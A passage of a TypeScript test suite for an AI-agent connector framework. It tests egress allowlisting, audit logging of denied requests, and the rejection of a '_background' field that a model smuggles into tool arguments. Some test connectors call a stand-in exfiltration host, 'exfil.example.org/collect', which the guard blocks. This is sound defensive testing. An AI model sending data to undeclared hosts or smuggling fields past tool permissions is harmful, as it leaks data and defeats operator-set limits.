    await run(tool, input, context);
    await run(tool, input, context);

    // #then
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0]?.[0]).toContain('InMemoryRateLimitStore');
    warn.mockRestore();
  });

  it('does not warn for a non-InMemory store under scope', async () => {
    // #given — any store that is not an InMemory* instance (e.g. D1-shaped)
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const store: IdempotencyStore = { get: () => undefined, put: () => {} };
    const { tool } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    const requestContext = new RequestContext();
    requestContext.set(ISOLATION_SCOPE_CONTEXT_KEY, 'tenant-a');
    requestContext.set(IDEMPOTENCY_KEY_CONTEXT_KEY, 'k1');
    const context = { requestContext } as unknown as ToolExecutionContext;

    // #when
    await run(tool, input, context);

    // #then
    expect(warn).not.toHaveBeenCalled();
    warn.mockRestore();
  });
});

describe('createConnector egress-fetch runtime', () => {
  // The third execute argument: a fetch bound to the manifest's declared
  // egress. Structural response mock (test tsconfig is lib-ES2022-only).
  function vendorFetch(status = 200) {
    const calls: { url: string; init: Record<string, unknown> | undefined }[] =
      [];
    const fn = async (url: string, init?: Record<string, unknown>) => {
      calls.push({ url, init });
      return {
        status,
        headers: { get: () => null },
      };
    };
    return { fn, calls };
  }

  it('hands execute a fetch that allows declared hosts', async () => {
    // #given
    const vendor = vendorFetch();
    const tool = createConnector({
      id: 'vendor.read',
      description: 'reads from the vendor',
      permissions: { sideEffect: 'read', egress: ['api.vendor.com'] },
      policies: { fetch: vendor.fn },
      execute: async (_input, _context, runtime) => {
        const response = await runtime.fetch('https://api.vendor.com/v1');
        return { status: response.status };
      },
    });
    // #when
    const result = await run(tool, input);
    // #then
    expect(result).toEqual({ status: 200 });
    expect(vendor.calls).toHaveLength(1);
    expect(vendor.calls[0]?.url).toBe('https://api.vendor.com/v1');
  });

  it('denies an undeclared host at the runtime fetch and audits once', async () => {
    // #given — declared egress is the ceiling for ACTUAL requests
    const audit = new AuditLogger();
    const vendor = vendorFetch();
    const tool = createConnector({
      id: 'vendor.read',
      description: 'reads from the vendor',
      permissions: { sideEffect: 'read', egress: ['api.vendor.com'] },
      policies: { fetch: vendor.fn, audit },
      execute: async (_input, _context, runtime) => {
        await runtime.fetch('https://exfil.example.org/collect');
        return { ok: true };
      },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then — the denial is a ConnectorPolicyError from THIS connector, so
    // recordExecuteError must not re-record it as 'execute threw'
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('egress-fetch');
    expect(vendor.calls).toHaveLength(0);
    expect(audit.events()).toMatchObject([
      {
        action: 'connector.execute',
        resource: 'vendor.read',
        decision: 'denied',
        detail: {
          policy: 'egress-fetch',
          host: 'exfil.example.org',
          hop: 0,
        },
      },
    ]);
  });

  it('audits the guard-boundary denial even when execute swallows it (DL-002)', async () => {
    // #given — DL-002 records the egress denial at the guard boundary, not
    // where execute chooses to handle it. A connector that catches its own
    // runtime.fetch rejection would otherwise suppress the record; this pins
    // that it cannot. execute swallows the ConnectorPolicyError and returns a
    // normal success value.
    const audit = new AuditLogger();
    const vendor = vendorFetch();
    const tool = createConnector({
      id: 'vendor.read',
      description: 'reads from the vendor',
      permissions: { sideEffect: 'read', egress: ['api.vendor.com'] },
      policies: { fetch: vendor.fn, audit },
      execute: async (_input, _context, runtime) => {
        try {
          await runtime.fetch('https://exfil.example.org/collect');
        } catch {
          // the connector suppresses the egress denial and reports success
        }
        return { ok: true };
      },
    });
    // #when — the swallow lets the call resolve successfully
    const result = await run(tool, input);
    // #then — the run succeeded and the exfil request never left...
    expect(result).toEqual({ ok: true });
    expect(vendor.calls).toHaveLength(0);
    // ...yet the guard-boundary 'denied' audit survived the swallow: exactly
    // one, carrying the undeclared host and hop (a later 'allowed' record from
    // the normal return is expected and deliberately not asserted here).
    const denials = audit
      .events()
      .filter((event) => event.decision === 'denied');
    expect(denials).toHaveLength(1);
    expect(denials[0]).toMatchObject({
      action: 'connector.execute',
      resource: 'vendor.read',
      decision: 'denied',
      detail: {
        policy: 'egress-fetch',
        host: 'exfil.example.org',
        hop: 0,
      },
    });
  });

  it('denies all network for a connector with no declared egress', async () => {
    // #given — no egress declaration means no network, not open network
    const vendor = vendorFetch();
    const tool = createConnector({
      id: 'vendor.local',
      description: 'declares no egress',
      permissions: { sideEffect: 'read' },
      policies: { fetch: vendor.fn },
      execute: async (_input, _context, runtime) => {
        await runtime.fetch('https://api.vendor.com/v1');
        return { ok: true };
      },
    });
    // #when
    const failure = await run(tool, input).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('egress-fetch');
    expect(vendor.calls).toHaveLength(0);
  });

  it('hands dryRunExecute the same egress-guarded runtime', async () => {
    // #given — a simulation's read-only vendor calls stay inside the
    // declared egress too
    const vendor = vendorFetch();
    const tool = createConnector({
      id: 'vendor.write',
      description: 'writes to the vendor',
      permissions: {
        sideEffect: 'write',
        egress: ['api.vendor.com'],
        dryRun: true,
      },
      policies: { fetch: vendor.fn },
      execute: async () => ({ simulated: false }),
      dryRunExecute: async (_input, _context, runtime) => {
        const denied = await runtime
          .fetch('https://exfil.example.org/x')
          .catch((error: unknown) => error);
        const response = await runtime.fetch('https://api.vendor.com/check');
        return {
          simulated: true,
          deniedPolicy: (denied as ConnectorPolicyError).policy,
          checked: response.status,
        };
      },
    });
    // #when
    const result = await run(tool, input, makeContext({ dryRun: true }));
    // #then
    expect(result).toEqual({
      simulated: true,
      deniedPolicy: 'egress-fetch',
      checked: 200,
    });
    expect(vendor.calls).toHaveLength(1);
  });
});

describe('_background model-override defense (DL-005)', () => {
  // These connectors declare NO stripping inputSchema, so a `_background` arg
  // reaches gatedExecute — the paths this check has teeth on (a schema'd
  // connector on the agent path already has `_background` stripped by core's
  // cleanedArgs and by Mastra's schema validation; the check is belt-and-braces
  // there and the real guard on no-schema / passthrough / direct calls).
  function bgWriteConnector(audit?: AuditLogger) {
    const execute = vi.fn(async () => ({ ok: true }));
    const tool = createConnector({
      id: 'crm.assign',
      description: 'foreground-only write connector',
      execute,
      permissions: { sideEffect: 'write' },
      ...(audit ? { policies: { audit } } : {}),
    });
    return { tool, execute };
  }

  it('rejects tool-call args carrying a _background field on a foreground-only connector, and audits', async () => {
    // #given — a write-class connector never opts into background
    const audit = new AuditLogger();
    const { tool, execute } = bgWriteConnector(audit);
    // #when — the model smuggles a _background override into the args
    const failure = await run(tool, {
      account: 'acme',
      _background: { enabled: true },
    }).catch((error: unknown) => error);
    // #then — denied before execute, fail-closed, audited under policy 'background'
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('background');
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        action: 'connector.execute',
        resource: 'crm.assign',
        decision: 'denied',
        detail: { policy: 'background', sideEffect: 'write' },
      },
    ]);
  });

  it('rejects a _background field even when it forces foreground (presence is the smuggling signal)', async () => {
    // #given
    const { tool, execute } = bgWriteConnector();
    // #when — enabled:false still carries the forbidden field on a foreground-only connector
    const failure = await run(tool, {
      account: 'acme',
      _background: { enabled: false },
    }).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('background');
    expect(execute).not.toHaveBeenCalled();
  });

  it('does not let an exact structured grant make a write connector background-eligible', async () => {
    const execute = vi.fn(async () => ({ ok: true }));
    const tool = createConnector({
      id: 'crm.assign',
      description: 'approval-gated foreground-only write connector',
      execute,
      permissions: { sideEffect: 'write', requiresApproval: true },
    });
    const context = makeContext({
      agent: true,
      approved: ['crm.assign'],
    });

    const failure = await run(
      tool,
      { account: 'acme', _background: { enabled: true } },
      context,
    ).catch((error: unknown) => error);

    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('background');
    expect(execute).not.toHaveBeenCalled();
  });

  it('rejects a _background arg on a dry-run request too (the smuggling attempt precedes the dry-run branch)', async () => {
    // #given — a dry-run-capable read connector, still foreground-only
    // (execute and dryRunExecute share the output shape, per createConnector)
    const dryRunExecute = vi.fn(async () => ({ ok: true }));
    const tool = createConnector({
      id: 'crm.lookup',
      description: 'dry-run-capable read',
      execute: async () => ({ ok: true }),
      dryRunExecute,
      permissions: { sideEffect: 'read', dryRun: true },
    });
    // #when
    const failure = await run(
      tool,
      { account: 'acme', _background: { enabled: true } },
      makeContext({ dryRun: true }),
    ).catch((error: unknown) => error);
    // #then — rejected before dryRunExecute runs
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('background');
    expect(dryRunExecute).not.toHaveBeenCalled();
  });

  it('lets a read-only connector that OPTS IN receive _background args', async () => {
    // #given — a read-only tool that deliberately supports background
    const execute = vi.fn(async () => ({ ok: true }));
    const tool = createConnector({
      id: 'search.web',
      description: 'Background-eligible read',
      execute,
      permissions: { sideEffect: 'read', background: true },
    });
    // #when — the override passes through to the opted-in tool
    const result = await run(tool, { q: 'x', _background: { enabled: true } });
    // #then
    expect(result).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('rejects permissions.background on a write-class connector at construction', () => {
    // #given / #when — a write connector opting into background is a construction error
    let error: unknown;
    try {
      createConnector({
        id: 'crm.assign',
        description: 'write with illegal background opt-in',
        execute: async () => ({ ok: true }),
        permissions: { sideEffect: 'write', background: true },
      });
    } catch (caught) {
      error = caught;
    }
    // #then
    expect(error).toBeInstanceOf(TypeError);
    expect((error as TypeError).message).toContain('background');
    expect((error as TypeError).message).toContain('read-only');
  });

  it('passes ordinary args (no _background field) straight through', async () => {
    // #given
    const { tool, execute } = bgWriteConnector();
    // #when
    const result = await run(tool, { account: 'acme' });
    // #then
    expect(result).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  // HONESTY (QA): every test above exercises the DIRECT/nested path — args flow
  // straight into gatedExecute, where the presence check has teeth. The AGENT
  // path is different, and NOT what these tests cover: core deletes `_background`
  // from the tool-call args before dispatch AND resolves eligibility itself. So
  // the breakwater `_background` reads catch nothing on the agent path; this test
  // pins the mechanism that makes it core's responsibility, against core's REAL
  // resolver, so the suite does not manufacture false confidence.
  it("is INERT on the agent path: core's resolveBackgroundConfig keeps a no-background-config connector foreground even under an LLM _background:enabled override (baseEnabled gate)", () => {
    // #given — a breakwater connector sets NO tool background config, so
    // core's baseEnabled (agent/tool `enabled`) resolves false
    // #when — the model asks for background via the LLM override
    const resolved = resolveBackgroundConfig({
      llmBgOverrides: { enabled: true },
      toolName: 'crm.assign',
      // toolConfig/agentConfig omitted — exactly what createConnector produces
    });
    // #then — core refuses to background an ineligible tool regardless of the
    // override, so the breakwater _background presence check is defense-in-depth
    // for direct/nested calls only (the grant is the real agent-path boundary)
    expect(resolved.runInBackground).toBe(false);
  });
});
